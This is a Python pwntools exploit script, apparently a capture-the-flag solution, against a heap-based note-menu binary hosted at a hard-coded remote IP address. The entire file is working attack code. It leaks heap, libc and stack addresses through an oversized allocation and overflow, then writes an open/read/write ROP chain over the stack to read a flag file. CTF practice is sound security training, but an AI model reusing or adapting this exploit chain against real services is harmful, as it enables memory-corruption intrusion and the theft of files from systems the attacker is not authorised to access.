from pwn import *
context(arch="amd64", os="linux", log_level="DEBUG")
#s=process("./pwn")
s=remote("39.106.16.204",25289)
#s=remote("localhost",9999)
libc=ELF("./2libc.so.6")
def menu(ch):
    s.sendlineafter(b"> ",str(ch).encode())
def add(size,content=b"/home/ctf/flag\x00"):
    menu(1)
    s.sendlineafter(b"length:\n",str(size).encode())
    s.sendlineafter(b"content:\n",content)

def delete(idx):
    menu(2)
    s.sendlineafter(b"index:\n",str(idx).encode())

def edit(idx,content):
    menu(3)
    s.sendlineafter(b"index:\n",str(idx).encode())
    s.sendlineafter(b"content:\n",content)

def show(idx):
    menu(4)
    s.sendlineafter(b"index:\n",str(idx).encode())
    s.recvuntil(b"Content:\n")
    return #s.recvline()[:-1]

if __name__=="__main__":
    add(0x30)
    add(0xffffffff)
    add(0x80)
    add(0x80)
    edit(1,b"a"*0x20)
    show(2)
    dat=s.recv(8)
    heap_base=u64(dat)-0x320
    success(hex(heap_base))
    delete(1)
    add(0x2000000)
    show(2)
    dat=s.recv(8)
    libc.address=u64(dat)-0x10+0x2004000-0x3000
    edit(2,p64(libc.sym.environ)+p64(9))
    success(hex(libc.address))
    show(1)
    dat=s.recv(8)
    stack=u64(dat)
    success(hex(stack))
    edit(2,p64(stack-0x2c0)+p64(0x1000))
    rroopp=ROP(libc)
    rdi=libc.address+0x000000000010f75b
    rsi_rbp=libc.address+0x000000000002b46b
    # rbx=libc.address+0x00000000000586e4
    rbx_rbp=libc.address+0x0000000000114d3a
    # 0x00000000000b0133 : mov rdx, rbx ; pop rbx ; pop r12 ; pop rbp ; ret
    magic=libc.address+0x00000000000b0133
    rop_chain=flat([
        rdi,heap_base+0x2c0,
        rsi_rbp,0,0,
        rbx_rbp,0,0,
        magic,0x100,0,0,
        libc.sym.open,
        rdi,3,
        rsi_rbp,heap_base+0x1000,0,
        magic,0x100,0,0,
        libc.sym.read,
        rdi,4,
        libc.sym.write,
    ])
    show(1)
    edit(1,rop_chain)
    s.interactive()
